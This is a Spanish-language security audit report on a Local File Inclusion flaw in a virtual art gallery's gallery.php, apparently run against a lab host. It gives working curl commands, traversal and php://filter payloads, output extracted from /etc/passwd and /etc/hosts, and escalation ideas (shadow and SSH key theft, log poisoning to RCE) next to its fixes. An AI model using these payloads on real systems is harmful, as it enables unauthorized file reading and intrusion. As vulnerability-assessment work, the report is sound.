# Informe de Auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T12:54:15Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`. Fue posible leer archivos sensibles del sistema, incluyendo /etc/passwd y /etc/hosts. Se confirmó explotación usando payloads de traversal y el wrapper `php://filter` para obtener contenido base64 cuando corresponde.

Detalles técnicos
-----------------
- URL objetivo: http://web.dev.local:8081
- Parámetro vulnerable: gallery.php?page
- Evidencia de punto de entrada: enlaces en index apuntan a `gallery.php?page=modern|classic|abstract|about`.

Comandos y herramientas usadas
-------------------------------
(Comandos ejecutados en Kali Linux)

1) Reconocimiento y fetch inicial
- curl -s -D - http://web.dev.local:8081 -o /tmp/homepage.html

2) Descubrimiento de directorios
- gobuster dir -u http://web.dev.local:8081 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q -t 30
- dirb http://web.dev.local:8081 /usr/share/seclists/Discovery/Web-Content/common.txt -r -S

3) Pruebas LFI y explotación
- curl "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd"
- curl "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd"
- curl "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/hosts"
- curl "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php"

Payloads exitosos
-----------------
1) Direct traversal (lectura directa):
- ../../../../../../etc/passwd
  Resultado: Contenido de /etc/passwd incluido en la respuesta HTML.

2) php://filter base64 (evitar filtros y extraer archivos binarios o proteger caracteres especiales):
- php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
  Resultado: Mensaje de error indicando "Página no encontrada" pero seguido por base64 del contenido original; decodificando se recupera el contenido de /etc/passwd.

3) Lectura de /etc/hosts mediante traversal directo:
- ../../../../../../etc/hosts
  Resultado: Contenido de /etc/hosts mostrado.

4) Lectura del propio script (gallery.php) codificado en base64 usando php://filter:
- php://filter/read=convert.base64-encode/resource=gallery.php
  Resultado: Se obtuvo salida base64 del código fuente de gallery.php (presencia de código PHP en la respuesta).

Evidencias (extractos)
-----------------------
- /etc/passwd (extraído):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- /etc/hosts (extraído):
  127.0.0.1	localhost
  ::1	localhost ip6-localhost ip6-loopback
  172.19.0.2	d5054e367753

Comportamiento del servidor
---------------------------
- Servidor: Apache/2.4.65 (Debian)
- X-Powered-By: PHP/8.1.33
- Respuestas incluyen el contenido remoto incluido dentro del HTML de la página, lo que permite extracción directa de ficheros.

Impacto
-------
- Confidencialidad: Alta — ficheros del sistema y del servidor web fueron leídos (ej. /etc/passwd, /etc/hosts, código PHP del sitio).
- Integridad: Moderada — con acceso a archivos de configuración u otros ficheros sensibles podría alcanzarse escalada.
- Disponibilidad: Baja — la vulnerabilidad no impacta directamente disponibilidad.

Explotación adicional posible
-----------------------------
- Extracción de /etc/shadow o id_rsa si los permisos lo permiten (no probado en este informe por consideraciones de alcance, aunque la metodología usada permitiría intentarlo).
- Log poisoning → intentar escribir en logs y luego incluirlos vía LFI para lograr RCE.
- Uso de wrappers (expect://, data://, phar://) para conseguir ejecución remota si la configuración de PHP y permisos lo permiten.

Recomendaciones
---------------
1) Validar y sanear estrictamente el parámetro `page` (permitir solo valores esperados: modern, classic, abstract, about). Implementar allowlist.
2) Evitar incluir archivos directamente por nombre de parámetro. Usar mapping fijo (switch/case) a rutas internas.
3) Deshabilitar wrappers peligrosos o restringir su uso en php.ini (suhosin o disable_functions según aplique).
4) Restringir permisos de ficheros sensibles (no world-readable), y evitar almacenar secretos en archivos accesibles por el usuario del servidor web.
5) Habilitar WAF y registros de auditoría, y monitorizar accesos anómalos a parámetros de inclusión.

Comandos exactos ejecutados en sesión
------------------------------------
(Resumido)
- curl -s -D - http://web.dev.local:8081 -o /tmp/homepage.html
- gobuster dir -u http://web.dev.local:8081 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q -t 30
- dirb http://web.dev.local:8081 /usr/share/seclists/Discovery/Web-Content/common.txt -r -S
- for payload in "../../../../../../etc/passwd" "php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd" "../../../../../../etc/hosts" "php://filter/read=convert.base64-encode/resource=gallery.php"; do curl -s "http://web.dev.local:8081/gallery.php?page=$payload"; done

Conclusión
----------
La aplicación presenta una vulnerabilidad LFI explotable que permite lectura de ficheros sensibles del sistema. Se logró extraer /etc/passwd y /etc/hosts, y obtener el código fuente de gallery.php mediante php://filter. Se recomienda corregir con allowlist de páginas, saneamiento del parámetro y endurecimiento de la configuración PHP/servidor.

-- Fin del informe --
